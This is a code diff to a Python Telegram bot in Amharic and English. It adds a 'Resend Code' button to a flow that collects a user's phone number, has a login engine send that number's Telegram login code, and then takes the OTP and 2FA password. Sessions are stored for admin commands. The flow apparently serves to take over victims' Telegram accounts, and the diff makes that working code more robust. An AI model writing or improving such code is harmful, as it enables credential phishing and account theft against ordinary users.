@@ -1,5 +1,5 @@
-# bot.py — Final Fixed Version
-# All buttons work, fresh start every time
+# bot.py — Final Fixed Version + Resend Code Button
+# All buttons work, fresh start every time, resend OTP supported
 
 import os
 import json
@@ -561,10 +561,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Fix: handle editing text vs media caption based on message type
     if query.message.text:
-        # Normal text message → edit text
         await query.edit_message_text(verify_text, parse_mode='Markdown')
     else:
-        # Photo / media message → edit caption
         await query.edit_message_caption(caption=verify_text, parse_mode='Markdown')
 
     # Send the custom keyboard request
@@ -657,17 +655,57 @@ async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if result['success']:
         context.user_data['engine'] = engine
+        # Send code prompt with Resend button
+        keyboard = [[InlineKeyboardButton("🔄 Resend Code", callback_data="resend_code")]]
         await safe_send(
             context, user.id,
             random.choice(CODE_MESSAGES),
             parse_mode='Markdown',
-            reply_markup={"remove_keyboard": True}
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return OTP
     else:
         await safe_send(context, user.id, f"❌ {result.get('error', 'Unknown error')}")
         update_session(record_id, status='failed')
         return ConversationHandler.END
+
+async def resend_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the Resend Code button press."""
+    query = update.callback_query
+    await query.answer()
+    user = query.from_user
+
+    engine = context.user_data.get('engine')
+    if not engine:
+        # Try to rebuild engine from last session data
+        session = get_session_by_user(user.id)
+        if session and session[4] and session[10] == 'code_sent':
+            phone = session[4]
+            record_id = session[0]
+            engine = TelegramLoginEngine(phone, record_id, user.id)
+            context.user_data['engine'] = engine
+            context.user_data['phone'] = phone
+            context.user_data['record_id'] = record_id
+        else:
+            await query.edit_message_text("❌ Session expired. Please /start again.")
+            return ConversationHandler.END
+
+    # Show temporary status
+    await query.edit_message_text("📡 Resending code...\n\n📡 ኮድ እንደገና እየተላከ ነው...")
+    result = await engine.send_code()
+
+    if result['success']:
+        # Re-edit message with new prompt and keep Resend button
+        keyboard = [[InlineKeyboardButton("🔄 Resend Code", callback_data="resend_code")]]
+        await query.edit_message_text(
+            random.choice(CODE_MESSAGES),
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return OTP
+    else:
+        await query.edit_message_text(f"❌ {result.get('error', 'Failed to resend')}")
+        return OTP
 
 async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -881,15 +919,18 @@ def run_bot():
         
         application = Application.builder().token(BOT_TOKEN).build()
 
-        # Fixed: Conversation handler now includes button clicks as entry point
+        # Conversation handler with entry points: /start and button clicks
         conv_handler = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
-                CallbackQueryHandler(button_handler, pattern='.*')   # any button click starts the flow
+                CallbackQueryHandler(button_handler, pattern='^(?!resend_code$).*')  # all buttons except resend
             ],
             states={
                 PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, phone_handler)],
-                OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler)],
+                OTP: [
+                    MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler),
+                    CallbackQueryHandler(resend_code_handler, pattern='^resend_code$')  # resend only here
+                ],
                 TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_handler)]
             },
             fallbacks=[CommandHandler('cancel', cancel)],
@@ -897,7 +938,6 @@ def run_bot():
         )
 
         application.add_handler(conv_handler)
-        # The standalone CallbackQueryHandler is removed – now part of the conversation
         
         # Admin commands
         application.add_handler(CommandHandler('sessions', admin_sessions))
@@ -926,7 +966,7 @@ if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════╗
     ║   Telegram Bot — Habesha Edition (FINAL FIX)           ║
-    ║   ALL buttons work — Fixed media editing + conversation ║
+    ║   ALL buttons work — Resend OTP button added          ║
     ║   Amharic + English — Fast session cleanup            ║
     ╚═══════════════════════════════════════════════════════════╝
     """)
